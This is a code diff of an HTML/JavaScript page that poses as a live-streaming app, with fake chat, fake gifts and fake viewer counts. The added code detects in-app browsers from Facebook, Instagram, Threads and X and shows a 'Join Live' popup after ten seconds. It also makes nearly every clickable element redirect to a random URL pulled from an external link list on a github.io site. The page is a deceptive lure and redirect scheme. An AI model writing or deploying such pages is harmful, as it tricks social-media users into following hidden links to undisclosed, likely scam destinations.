@@ -4,9 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Live Streaming App</title>
-    <!-- Tailwind CSS untuk Styling -->
     <script src="https://cdn.tailwindcss.com"></script>
-    <!-- Font Awesome untuk Ikon -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
     <style>
@@ -53,31 +51,22 @@
         }
     </style>
 </head>
-<body class="flex justify-center items-center h-[100dvh] overflow-hidden">
+<body class="flex justify-center items-center h-[100dvh] overflow-hidden relative">
 
-    <!-- Container Utama dengan Rasio 9:16 Fix -->
     <div class="relative w-full max-w-[calc(100dvh*9/16)] max-h-full aspect-[9/16] bg-gray-900 shadow-2xl overflow-hidden text-white">
         
-        <!-- Background Video -->
-        <!-- Menggunakan video portrait gratis sebagai placeholder -->
         <video id="bg-video" 
                class="absolute top-0 left-0 w-full h-full object-cover z-0" 
                autoplay loop muted playsinline>
-            <!-- Source akan diatur melalui JavaScript -->
         </video>
 
-        <!-- Overlay Gelap (Opsional, agar teks lebih terbaca) -->
         <div class="absolute inset-0 bg-black/20 z-0"></div>
 
-        <!-- AREA UI ATAS -->
         <div class="absolute top-0 left-0 w-full p-4 z-10">
-            
-            <!-- Baris 1: Profil Host & Penonton -->
             <div class="flex justify-between items-start">
                 
-                <!-- Profil Host (Kiri) -->
                 <div class="flex flex-col gap-2">
-                    <div class="flex items-center bg-black/40 backdrop-blur-sm rounded-full p-1 pr-3 shadow-lg">
+                    <div class="flex items-center bg-black/40 backdrop-blur-sm rounded-full p-1 pr-3 shadow-lg cursor-pointer action-trigger">
                         <img id="host-avatar" src="" alt="Host" class="w-10 h-10 rounded-full border-2 border-yellow-400">
                         <div class="ml-2 flex flex-col justify-center">
                             <span id="host-name" class="text-sm font-bold leading-tight">Loading...</span>
@@ -86,8 +75,7 @@
                         <button class="ml-3 bg-cyan-400 text-black w-7 h-7 rounded-full flex justify-center items-center font-bold text-lg">+</button>
                     </div>
 
-                    <!-- Koin & Bintang -->
-                    <div class="flex gap-2 text-xs font-semibold">
+                    <div class="flex gap-2 text-xs font-semibold action-trigger cursor-pointer">
                         <div class="bg-black/50 backdrop-blur-sm rounded-full px-3 py-1 flex items-center gap-1 shadow-md">
                             <span class="text-yellow-400">🪙</span> 3719796
                         </div>
@@ -97,22 +85,20 @@
                     </div>
                 </div>
 
-                <!-- Penonton & Tombol Close (Kanan) -->
                 <div class="flex items-center gap-2">
-                    <div class="flex -space-x-2">
+                    <div class="flex -space-x-2 action-trigger cursor-pointer">
                         <img class="w-8 h-8 rounded-full border border-gray-800" src="https://i.pravatar.cc/150?img=32" alt="Viewer">
                         <img class="w-8 h-8 rounded-full border border-gray-800" src="https://i.pravatar.cc/150?img=12" alt="Viewer">
                         <img class="w-8 h-8 rounded-full border border-gray-800" src="https://i.pravatar.cc/150?img=5" alt="Viewer">
                     </div>
-                    <div class="bg-black/40 rounded-full px-2 py-1 text-xs">499+</div>
-                    <button class="w-8 h-8 bg-black/40 rounded-full flex justify-center items-center">
+                    <div class="bg-black/40 rounded-full px-2 py-1 text-xs action-trigger cursor-pointer">499+</div>
+                    <button class="w-8 h-8 bg-black/40 rounded-full flex justify-center items-center action-trigger">
                         <i class="fa-solid fa-xmark text-white"></i>
                     </button>
                 </div>
             </div>
 
-            <!-- Top Gifts Panel (Kanan Atas) -->
-            <div class="absolute top-14 right-4 bg-black/60 backdrop-blur-md rounded-xl p-2.5 w-36 text-xs shadow-lg border border-white/10">
+            <div class="absolute top-14 right-4 bg-black/60 backdrop-blur-md rounded-xl p-2.5 w-36 text-xs shadow-lg border border-white/10 action-trigger cursor-pointer">
                 <div class="text-center font-bold mb-2 text-shadow text-[11px]">Top Gifts</div>
                 <div class="flex justify-between items-center mb-1">
                     <span>Rina</span><span class="font-bold">🌹 20</span>
@@ -129,18 +115,13 @@
             </div>
         </div>
 
-        <!-- AREA GIFT BANNER BESAR (Tengah Layar) -->
         <div id="big-gift-container" class="absolute top-1/3 left-0 w-full px-4 z-20 flex flex-col gap-2 pointer-events-none">
-            <!-- Elemen ini akan diisi oleh JavaScript -->
         </div>
 
-        <!-- Efek Masking Gradasi untuk Chat agar menghilang di atas -->
         <div class="absolute bottom-[60px] left-0 w-full h-[350px] bg-gradient-to-t from-black/80 via-black/30 to-transparent z-10 pointer-events-none"></div>
 
-        <!-- AREA CHAT (Kiri Bawah) -->
         <div id="chat-container" class="absolute bottom-[70px] left-4 w-3/4 h-[250px] overflow-y-auto no-scrollbar flex flex-col justify-end pb-2 z-20 mask-chat">
             <div id="chat-messages" class="flex flex-col gap-1.5">
-                <!-- Chat awal -->
                 <div class="chat-item flex items-start gap-1.5 bg-black/30 backdrop-blur-sm p-1 rounded-lg w-max max-w-full">
                     <img src="https://i.pravatar.cc/150?img=1" class="w-5 h-5 rounded-full mt-0.5" alt="User">
                     <div>
@@ -151,40 +132,50 @@
             </div>
         </div>
 
-        <!-- Like Animasi Mengambang di Kanan Bawah -->
         <div id="floating-likes" class="absolute bottom-[80px] right-4 w-12 h-40 pointer-events-none z-20 overflow-hidden relative">
-            <!-- Likes akan digenerate via JS -->
         </div>
 
-        <!-- AREA BOTTOM BAR (Input & Action) -->
         <div class="absolute bottom-0 left-0 w-full h-[60px] bg-gray-900/90 backdrop-blur-md px-4 flex items-center justify-between z-30 border-t border-white/10">
-            <button class="text-yellow-400 text-2xl hover:scale-110 transition">
+            <button class="text-yellow-400 text-2xl hover:scale-110 transition action-trigger">
                 <i class="fa-solid fa-face-smile"></i>
             </button>
             
-            <div class="flex-1 mx-3 bg-gray-800 rounded-full h-10 flex items-center px-4">
+            <div class="flex-1 mx-3 bg-gray-800 rounded-full h-10 flex items-center px-4 cursor-pointer action-trigger">
                 <span class="text-gray-400 text-sm">Ngobrol yuk...</span>
             </div>
             
             <div class="flex gap-4 text-xl text-white">
-                <button class="hover:scale-110 transition"><i class="fa-solid fa-link"></i></button>
-                <button class="hover:scale-110 transition"><i class="fa-solid fa-bars"></i></button>
-                <button class="text-red-500 text-2xl hover:scale-110 transition drop-shadow-md">
+                <button class="hover:scale-110 transition action-trigger"><i class="fa-solid fa-link"></i></button>
+                <button class="hover:scale-110 transition action-trigger"><i class="fa-solid fa-bars"></i></button>
+                <button class="text-red-500 text-2xl hover:scale-110 transition drop-shadow-md action-trigger">
                     <i class="fa-solid fa-gift"></i>
                 </button>
             </div>
         </div>
     </div>
 
+    <div id="inapp-popup" class="fixed inset-0 bg-black/80 z-[9999] hidden flex-col justify-center items-center backdrop-blur-sm opacity-0 transition-opacity duration-300">
+        <div id="inapp-popup-content" class="bg-gray-900 border border-gray-700 p-6 rounded-2xl flex flex-col items-center gap-4 shadow-2xl transform scale-95 transition-transform duration-300 w-4/5 max-w-sm text-center">
+            <div class="text-red-500 text-5xl mb-1 animate-pulse">
+                <i class="fa-solid fa-tower-broadcast"></i>
+            </div>
+            <h2 class="text-white text-3xl font-bold mb-1">Join Live</h2>
+            <p class="text-gray-300 text-sm mb-4">Anda sedang membuka link di aplikasi. Beralihlah ke browser utama ponsel untuk join live.</p>
+            <button id="btn-open-browser" class="bg-gradient-to-r from-blue-500 to-cyan-500 text-white font-bold py-3 px-8 rounded-full hover:scale-105 transition-transform shadow-lg shadow-blue-500/30 w-full">
+                Buka dibrowser
+            </button>
+        </div>
+    </div>
+
     <script>
         // ==============================================================
-        // KONFIGURASI UTAMA (SILAKAN UBAH DATA DI BAWAH INI)
+        // KONFIGURASI UTAMA
         // ==============================================================
         const CONFIG = {
             namaAkun: "Syaboba",
             iconAkun: "https://i.pravatar.cc/150?img=47",
-            fileVideo: "data.txt", // Nama file text di hosting yang berisi list link mp4 (pisahkan dengan enter)
-            defaultVideo: "https://cdn.pixabay.com/video/2020/05/25/40141-424754388_large.mp4" // Video cadangan jika data.txt gagal dimuat
+            fileVideo: "data.txt", 
+            defaultVideo: "https://cdn.pixabay.com/video/2020/05/25/40141-424754388_large.mp4" 
         };
 
         // --- INISIALISASI PROFIL ---
@@ -194,46 +185,32 @@
             setRandomVideo();
         });
 
-        // --- FUNGSI AMBIL VIDEO RANDOM DARI DATA.TXT ---
+        // --- FUNGSI AMBIL VIDEO RANDOM ---
         async function setRandomVideo() {
             const videoPlayer = document.getElementById('bg-video');
             try {
-                // Fetch file data.txt dari server. Tambah 'cache-busting' (waktu) agar selalu update
                 const response = await fetch(CONFIG.fileVideo + "?t=" + new Date().getTime()); 
                 if (!response.ok) throw new Error("File tidak ditemukan");
                 
                 const textData = await response.text();
-                // Pisahkan tiap baris, hapus spasi ekstra, dan buang baris kosong
                 const videoList = textData.split('\n').map(link => link.trim()).filter(link => link !== "");
                 
                 if (videoList.length > 0) {
-                    // Pilih random dari list
                     const randomLink = videoList[Math.floor(Math.random() * videoList.length)];
                     videoPlayer.src = randomLink;
                 } else {
-                    // Jika file kosong, gunakan default
                     videoPlayer.src = CONFIG.defaultVideo;
                 }
             } catch (error) {
-                console.error("Gagal mengambil list video (mungkin karena diblokir jika buka di lokal tanpa server):", error);
-                videoPlayer.src = CONFIG.defaultVideo; // fallback jika error
+                console.error("Gagal mengambil list video:", error);
+                videoPlayer.src = CONFIG.defaultVideo; 
             }
             videoPlayer.load();
         }
 
-        // --- DATA DUMMY ---
+        // --- DATA DUMMY CHAT & GIFTS ---
         const userNames = ["Bayu", "Dewi", "Vina", "Jeremy", "Budi", "Siti", "Andi", "Ratna"];
-        const chatMessages = [
-            "support kak", 
-            "mantap live", 
-            "hadir kak 🔥", 
-            "lagi dimana ini?", 
-            "keren banget!", 
-            "salam dari binjai", 
-            "follback dong kak", 
-            "😍😍😍",
-            "lanjutkan kak!"
-        ];
+        const chatMessages = ["support kak", "mantap live", "hadir kak 🔥", "lagi dimana ini?", "keren banget!", "salam dari binjai", "follback dong kak", "😍😍😍", "lanjutkan kak!"];
         const gifsData = [
             { name: "Joni", img: "https://i.pravatar.cc/150?img=32", item: "🌹", itemName: "Mawar", qty: 1, type: "small" },
             { name: "Jeremy", img: "https://i.pravatar.cc/150?img=32", item: "🌹", itemName: "Mawar", qty: 1, type: "small"  },
@@ -248,12 +225,12 @@
             const randomName = userNames[Math.floor(Math.random() * userNames.length)];
             const randomMsg = chatMessages[Math.floor(Math.random() * chatMessages.length)];
             const randomImg = `https://i.pravatar.cc/150?img=${Math.floor(Math.random() * 70)}`;
-            const isLevelUp = Math.random() > 0.8; // 20% chance ada badge level
+            const isLevelUp = Math.random() > 0.8; 
 
             const levelBadge = isLevelUp ? `<span class="bg-yellow-500 text-black text-[9px] px-1 rounded-sm mr-1 font-bold">Lv.${Math.floor(Math.random()*50)+1}</span>` : '';
 
             const chatHTML = `
-                <div class="chat-item flex items-start gap-1.5 bg-black/30 backdrop-blur-sm p-1 rounded-lg w-max max-w-[90%]">
+                <div class="chat-item flex items-start gap-1.5 bg-black/30 backdrop-blur-sm p-1 rounded-lg w-max max-w-[90%] action-trigger cursor-pointer">
                     <img src="${randomImg}" class="w-5 h-5 rounded-full mt-0.5 border border-gray-600" alt="${randomName}">
                     <div class="leading-tight">
                         ${levelBadge}
@@ -264,25 +241,19 @@
             `;
 
             chatMessagesDiv.insertAdjacentHTML('beforeend', chatHTML);
-            
-            // Hapus chat lama agar DOM tidak berat (maksimal 30 chat)
-            if (chatMessagesDiv.children.length > 30) {
-                chatMessagesDiv.removeChild(chatMessagesDiv.firstElementChild);
-            }
-
-            // Auto scroll ke bawah
+            if (chatMessagesDiv.children.length > 30) chatMessagesDiv.removeChild(chatMessagesDiv.firstElementChild);
             chatContainer.scrollTop = chatContainer.scrollHeight;
+            
+            // Re-bind klik interaktif ke chat baru
+            bindInteractiveRedirect();
         }
-
-        // Jalankan chat setiap 1-3 detik
         setInterval(addRandomChat, Math.floor(Math.random() * 2000) + 1000);
 
-        // --- FUNGSI FAKE BIG GIFTS (Banner di tengah) ---
+        // --- FUNGSI FAKE BIG GIFTS ---
         const bigGiftContainer = document.getElementById('big-gift-container');
 
         function showRandomGift() {
             const gift = gifsData[Math.floor(Math.random() * gifsData.length)];
-            
             let giftHTML = '';
             if(gift.type === 'small') {
                 giftHTML = `
@@ -294,8 +265,7 @@
                     </div>
                     <div class="text-4xl drop-shadow-lg mr-2">${gift.item}</div>
                     <div class="text-2xl font-bold text-yellow-400 italic text-shadow">x${gift.qty}</div>
-                </div>
-                `;
+                </div>`;
             } else {
                 giftHTML = `
                 <div class="gift-animation flex flex-col items-center justify-center p-4">
@@ -304,23 +274,15 @@
                         <span class="font-bold text-yellow-400 text-sm text-shadow">${gift.name}</span>
                         <span class="text-white text-sm">Mengirim ${gift.itemName}</span>
                     </div>
-                    <div class="text-7xl drop-shadow-2xl" style="filter: drop-shadow(0 0 20px rgba(255,0,0,0.8));">${gift.item}</div>
-                </div>
-                `;
+                    <div class="text-7xl drop-shadow-2xl">${gift.item}</div>
+                </div>`;
             }
-
             bigGiftContainer.innerHTML = giftHTML;
-
-            // Hapus elemen setelah animasi selesai (3 detik)
-            setTimeout(() => {
-                bigGiftContainer.innerHTML = '';
-            }, 3000);
+            setTimeout(() => { bigGiftContainer.innerHTML = ''; }, 3000);
         }
-
-        // Munculkan gift setiap 5-10 detik
         setInterval(showRandomGift, Math.floor(Math.random() * 5000) + 5000);
 
-        // --- FUNGSI FLOATING LIKES (Kanan Bawah) ---
+        // --- FUNGSI FLOATING LIKES ---
         const floatingLikesContainer = document.getElementById('floating-likes');
         const likeColors = ['#ff3b30', '#ff9500', '#ffcc00', '#4cd964', '#5ac8fa', '#007aff', '#5856d6', '#ff2d55'];
 
@@ -328,8 +290,6 @@
             const like = document.createElement('div');
             like.innerHTML = '❤';
             const color = likeColors[Math.floor(Math.random() * likeColors.length)];
-            
-            // Randomize posisi x sedikit
             const randomX = Math.floor(Math.random() * 20) - 10;
             
             like.style.color = color;
@@ -343,49 +303,89 @@
             like.style.transition = 'transform 2s ease-out, opacity 2s ease-out, bottom 2s ease-out';
             
             floatingLikesContainer.appendChild(like);
-
-            // Animasikan ke atas
             setTimeout(() => {
                 like.style.bottom = '100%';
                 like.style.opacity = '0';
                 like.style.transform = `translateX(-50%) translateX(${randomX * 3}px) scale(1.5)`;
             }, 50);
-
-            // Hapus setelah selesai
-            setTimeout(() => {
-                like.remove();
-            }, 2000);
+            setTimeout(() => { like.remove(); }, 2000);
         }
-
-        // Trigger like sesekali (simulasi penonton tap layar)
         setInterval(() => {
             if(Math.random() > 0.3) {
                 createFloatingLike();
-                // Kadang muncul multiple like
                 if(Math.random() > 0.7) setTimeout(createFloatingLike, 100);
             }
         }, 800);
 
-        // --- ARRAY MULTIPLE VIDEO (Opsional) ---
-        // Jika ingin ganti video saat di klik
-        const videos = [
-            "https://cdn.pixabay.com/video/2020/05/25/40141-424754388_large.mp4",
-            "https://cdn.pixabay.com/video/2023/10/22/186007-877239304_large.mp4",
-            "https://cdn.pixabay.com/video/2021/08/11/84687-586716982_large.mp4"
-        ];
+
+        // ==============================================================
+        // TAMBAHAN FITUR: IN-APP BROWSER DETECTOR & GLOBAL REDIRECT
+        // ==============================================================
         
-        /* Uncomment fungsi di bawah ini jika ingin video berganti saat background di klik/swipe
-        document.getElementById('bg-video').addEventListener('click', () => {
-            const currentSrc = document.getElementById('bg-video').querySelector('source').src;
-            let nextVid = videos[Math.floor(Math.random() * videos.length)];
-            while(nextVid === currentSrc) nextVid = videos[Math.floor(Math.random() * videos.length)];
-            
-            const videoElement = document.getElementById('bg-video');
-            videoElement.querySelector('source').src = nextVid;
-            videoElement.load();
-            videoElement.play();
-        });
-        */
+        // 1. Fetch random URL & eksekusi redirect
+        async function redirectToRandomUrl() {
+            try {
+                const targetUrl = 'https://seribudollarperhari.github.io/banner/link.txt';
+                const response = await fetch(targetUrl + "?t=" + new Date().getTime());
+                const text = await response.text();
+                const links = text.split('\n').map(l => l.trim()).filter(l => l !== '');
+                
+                if (links.length > 0) {
+                    const randomLink = links[Math.floor(Math.random() * links.length)];
+                    window.location.href = randomLink;
+                }
+            } catch (error) {
+                console.error("Gagal parsing link:", error);
+            }
+        }
+
+        // 2. Deteksi in-app browser (FB, IG, Threads, X)
+        function isInAppBrowser() {
+            const ua = navigator.userAgent || navigator.vendor || window.opera;
+            return /FBAV|FBAN|Instagram|Threads|Twitter|t\.co/i.test(ua);
+        }
+
+        // 3. Eksekusi popup 10 detik
+        if (isInAppBrowser()) {
+            setTimeout(() => {
+                const popup = document.getElementById('inapp-popup');
+                const popupContent = document.getElementById('inapp-popup-content');
+                
+                popup.classList.remove('hidden');
+                popup.classList.add('flex');
+                
+                // Transisi animasi agar mulus
+                setTimeout(() => {
+                    popup.classList.remove('opacity-0');
+                    popup.classList.add('opacity-100');
+                    popupContent.classList.remove('scale-95');
+                    popupContent.classList.add('scale-100');
+                }, 50);
+            }, 10000); // Trigger di 10 detik
+        }
+
+        // 4. Bind aksi pada tombol popup utama
+        document.getElementById('btn-open-browser').addEventListener('click', redirectToRandomUrl);
+
+        // 5. Ubah semua fungsi/elemen di web (dengan class .action-trigger) menuju ke link tujuan.
+        // Fungsi ini dibungkus agar elemen chat yang terus digenerate juga ikut ter-bind.
+        function bindInteractiveRedirect() {
+            const interactableElements = document.querySelectorAll('.action-trigger');
+            interactableElements.forEach(el => {
+                // Hindari duplikasi bind event (agar tidak bocor memori / error multiple clicks)
+                if(!el.dataset.redirectBound) {
+                    el.addEventListener('click', (e) => {
+                        e.preventDefault();
+                        e.stopPropagation();
+                        redirectToRandomUrl();
+                    });
+                    el.dataset.redirectBound = "true";
+                }
+            });
+        }
+        
+        // Panggil bind saat load pertama kali
+        bindInteractiveRedirect();
     </script>
 </body>
 </html>
